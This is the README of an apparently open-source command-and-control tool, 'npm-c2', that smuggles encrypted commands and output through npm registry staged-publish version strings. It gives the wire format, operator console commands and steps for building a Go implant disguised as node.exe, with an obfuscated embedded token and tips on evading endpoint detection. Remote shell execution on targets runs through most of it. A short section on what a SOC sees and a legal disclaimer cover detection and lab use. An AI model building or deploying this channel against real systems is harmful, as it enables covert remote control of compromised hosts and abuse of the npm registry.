# npm-c2

[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Python 3.8+](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://python.org)
[![Implant: Go](https://img.shields.io/badge/implant-Go-lightgrey.svg)](go/)

A command channel that lives inside the npm registry. No server, no domain, no
certificate, no infrastructure to keep alive. You publish a package nobody has a
reason to install, write commands into it through the registry API, and a Go
binary on the target reads them over the same HTTPS connection that every
developer laptop already makes to `registry.npmjs.org`.

The traffic is boring by design: one allowlisted hostname, port 443, an npm user
agent, small requests, no inbound listener. That is the whole idea.

## How it works

```
operator                     npm registry                    implant (node.exe)
   |                              |                                |
   |-- POST /-/stage/package/<pkg> -->|                           |
   |   version string = command      |<-- GET /-/stage -----------|
   |                                 |    every interval + jitter |
   |                                 |                           |-- runs it
   |<-- GET /-/stage ----------------|<-- POST .../<pkg> --------|
   |   version string = output       |   version string = reply    |
```

npm retired classic tokens and stopped letting granular tokens with
`bypass_2fa` write dist-tags (`PUT /-/package/<pkg>/dist-tags/<tag>` answers
403). The one write path left to automation is staging a publish:
`POST /-/stage/package/<pkg>` answers 201. The channel rides that.

A staged publish gives the reader back only the **version string**, so the
version itself has to carry the data. Semver limits force a compact format:

```
0.0.0-<channel>.<h><seq>.<kind>.<payload>

channel   4 chars, first one a-f     never looks like a number
seq       "h" plus 6 hex digits      leading zeros are legal, fixed width
kind      c = command, r = reply
payload   base32 A-Z2-7              no 0 or 1, so it never trips the
                                     semver leading-zero rule
```

Capacity is about 227 base32 characters, roughly 141 bytes per version. A
command or a reply is a handful of versions. Before it goes out, every payload
is compressed and sealed with AES-256-GCM: the key comes from a shared
passphrase through HKDF-SHA256, with a fresh nonce per message and the package
name as additional authenticated data, so a ciphertext cannot be replayed into
another channel. The passphrase and the token are embedded obfuscated, so
`strings` on the binary does not reveal either.

The implant polls `GET /-/stage?page=N&perPage=100`, keeps the versions for its
channel with kind `c`, reassembles the message, runs it with `/bin/sh` outside
Windows or `cmd.exe` on Windows, and stages the output back as kind `r`. The
operator publishes commands and polls until the reply appears. Reading the
staging list requires the token, unlike the old public dist-tag map.

Staged versions never reach the public packument, so `npm view <pkg> versions`
still shows only the placeholder version. Everything the channel writes stays
in the account's staging list.

## Requirements

- Python 3.8 or newer for the operator console
- Go 1.21 or newer, only to build the implant
- An npm account and one package you control
- A granular access token that can read the staging list and stage a publish

## Install

Linux and macOS:

```sh
git clone https://github.com/ikarus981/npm-c2.git
cd npm-c2
./c2.sh --help
```

The first run creates `.venv` in the repository and installs the package into
it. Nothing touches your system Python.

Windows:

```powershell
git clone https://github.com/ikarus981/npm-c2.git
cd npm-c2
.\c2.cmd --help
```

`c2.cmd` calls `c2.ps1` with `-ExecutionPolicy Bypass`, so you do not have to
change the machine policy. The first run creates `.venv` with the `py`
launcher and installs the package there. You can call `.\c2.ps1` directly from
PowerShell if you prefer.

## Configure

The console reads its settings from the environment, so nothing secret lives in
the repository.

| Variable | Meaning | Default |
|---|---|---|
| `C2_PKG` | package that carries the channel | none, required |
| `C2_CHAN` | 4-character channel id, first char `a` to `f` | `c0ff` |
| `C2_PASS` | channel passphrase, empty means plaintext | empty |
| `C2_TOKEN` | npm token, falls back to `.c2token` | none |
| `NPMC2_API_BASE` | registry base URL | `https://registry.npmjs.org` |

Put the token in a file called `.c2token` with mode 600 instead of exporting it
if you do not want it in your shell history:

```sh
printf '%s' 'npm_xxxx' > .c2token
chmod 600 .c2token
```

The channel id and the passphrase must match the ones baked into the implant.
The operator and the implant number their messages independently, so each side
tracks the sequence numbers it has already handled rather than a single high
water mark.

## Use the console

```sh
export C2_PKG=your-package
export C2_CHAN=c0ff
export C2_PASS='a passphrase only you know'

./c2.sh                  # interactive console
./c2.sh "whoami"         # one command, then its output
./c2.sh -c beef "dir"    # override the channel for one run
```

A session looks like this:

```
[*] channel c0ff on your-package
c2> whoami
[*] staged 0.0.0-c0ff.h000001.c.AAD7XL5MTJFU...
[*] waiting up to 120s for output
DESKTOP-7F3A\user
c2> :quit
```

On Windows the same commands go through `.\c2.ps1 "whoami"` or
`.\c2.cmd "whoami"`.

`npm-c2 doctor -p <pkg> -t <token>` is also there if you want to check the
token and the package against the real registry before starting.

## Build the implant

The binary carries its whole configuration at build time and runs with no
arguments. The shortest path is a config file:

```sh
cp c2.example.json c2.json
# edit c2.json: package, token, channel, passphrase, interval, jitter
python3 make.py
```

That prints the artifacts in `native/dist/`, normally `node.exe` (amd64) and
`node-x86.exe` if `arch` is `both`. `c2.json` is ignored by git, so it never
leaves your machine.

Or call the builder directly:

```sh
python3 native/build_go.py \
  -p your-package \
  -t npm_xxxx \
  --stage-chan c0ff \
  --passphrase 'a passphrase only you know' \
  --interval 30 --jitter 5
```

Useful flags: `--32` to also build 386, `--upx` to pack the exe (smaller, but
`UPX0`/`UPX1` signatures get flagged by endpoint products), `--name` for the
output filename, `--api-base` to point at a registry you run yourself.
Building from Linux uses `gcc-mingw-w64` for the icon and version resource;
hosts without it fall back to the compiled `.syso` files in `go/resource`.

Windows is the tested target. The implant also runs on Linux and macOS, where
it executes commands with `/bin/sh`.

## On the target

Copy `node.exe` and run it with no arguments. It polls every `interval` plus a
random jitter, executes what it finds, and writes the output back. No inbound
port, no second channel, no operator-side connection to the host.

## Cleanup

There is no delete API for staged versions. Every message leaves one behind,
and the only way to remove them is npmjs.com, Staged Packages, Reject, one at a
time. Use a fresh channel (`-c` or `C2_CHAN`) for each engagement so you do not
drag old history along, and reject the versions when you are done.

## What a SOC sees

Every request is HTTPS to an allowlisted host, which is why the channel works.
What gives it away is the shape, not the content: one package polled on a flat
cadence for hours, HTTP/2 under an npm user agent when real npm clients speak
HTTP/1.1, a request with no `Accept` header, a JA3 from Go's TLS stack wearing
Node's name, and staged versions whose prerelease is a base32 blob instead of a
build identifier. Without TLS termination the path and the version string are
encrypted and only SNI, IP, port, byte counts and timing remain.

There is a full write-up with traffic analysis and Sigma rules on
[the blog](https://ikarus981.github.io/posts/npm-registry-c2-channel/).

## Limits

- About 141 bytes of payload per staged version, roughly 4.5 KB per reply.
- One command per poll cycle. The operator polls every few seconds while it
  waits for output.
- Staged versions accumulate in the account and have to be rejected by hand.
- Slow, small and noisy by design. A research tool, not a replacement for a
  real C2 framework.

## Repository layout

```
src/npm_c2/       operator console, staging transport, crypto, CLI
go/               Go implant (Windows target), wire format, resources
native/           build_go.py and the icon
c2.sh             Linux and macOS launcher
c2.ps1, c2.cmd    Windows launchers
c2.example.json   template for make.py
make.py           config file to deploy-ready binary
```

## Legal

Published for research and for blue teams building detections. Run it against
your own accounts and your own lab. Using it against infrastructure you do not
own or have written permission to test is illegal in most jurisdictions and is
not what this repository is for.

## License

Apache License 2.0. See [LICENSE](LICENSE).
